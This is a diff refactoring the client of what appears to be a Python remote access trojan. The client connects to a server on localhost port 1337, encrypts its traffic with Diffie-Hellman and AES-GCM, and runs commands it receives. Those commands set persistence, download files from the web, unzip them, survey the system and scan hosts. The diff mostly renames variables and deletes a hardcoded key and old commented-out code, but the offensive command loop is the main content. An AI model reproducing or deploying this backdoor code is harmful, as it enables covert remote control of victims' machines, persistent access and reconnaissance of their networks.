@@ -8,10 +8,8 @@
 
 import socket
 import subprocess
-import struct
 import sys
 
-from core import common
 from core import crypto
 from core import filesock
 from core import persistence
@@ -20,32 +18,27 @@ from core import survey
 from core import toolkit
 
 
-PLAT_TYPE = sys.platform
-HOST      = 'localhost'
-PORT      = 1337
-FB_KEY    = '82e672ae054aa4de6f042c888111686a'
-# generate your own key with...
-# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
+PLAT = sys.platform
+HOST = 'localhost'
+PORT = 1337
 
 
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
 
-    dh_key = crypto.diffiehellman(s)
-    GCM = crypto.AES_GCM(dh_key)
-    IV = 0
-    
+    dh_key  = crypto.diffiehellman(s)
+    GCM     = crypto.AES_GCM(dh_key)
+    IV      = 0
+
     s.setblocking(0)
 
     while True:
-        #data = s.recv(1024)
-        #data = crypto.AES_decrypt(data, dh_key)
         data = crypto.recvGCM(s, GCM)
-        IV += 1
-        
         if not data:
             continue
+
+        IV += 1
 
         # seperate prompt into command and action
         cmd, _, action = data.partition(' ')
@@ -81,33 +74,28 @@ def main():
 
         # apply persistence mechanism
         elif cmd == 'persistence':
-            results = persistence.run(PLAT_TYPE)
+            results = persistence.run(PLAT)
             crypto.sendGCM(s, GCM, IV, results)
-            #s.send(crypto.AES_encrypt(results, dh_key))
 
         # download a file from the web
         elif cmd == 'wget':
             results = toolkit.wget(action)
             crypto.sendGCM(s, GCM, IV, results)
-            #s.send(crypto.AES_encrypt(results, dh_key))
 
         # unzip a file
         elif cmd == 'unzip':
             results = toolkit.unzip(action)
             crypto.sendGCM(s, GCM, IV, results)
-            #s.send(crypto.AES_encrypt(results, dh_key))
 
         # run system survey
         elif cmd == 'survey':
-            results = survey.run(PLAT_TYPE)
+            results = survey.run(PLAT)
             crypto.sendGCM(s, GCM, IV, results)
-            #s.send(crypto.AES_encrypt(results, dh_key))
 
         # run a scan
         elif cmd == 'scan':
             results = scan.single_host(action)
             crypto.sendGCM(s, GCM, IV, results)
-            #s.send(crypto.AES_encrypt(results, dh_key))
 
 
 if __name__ == '__main__':
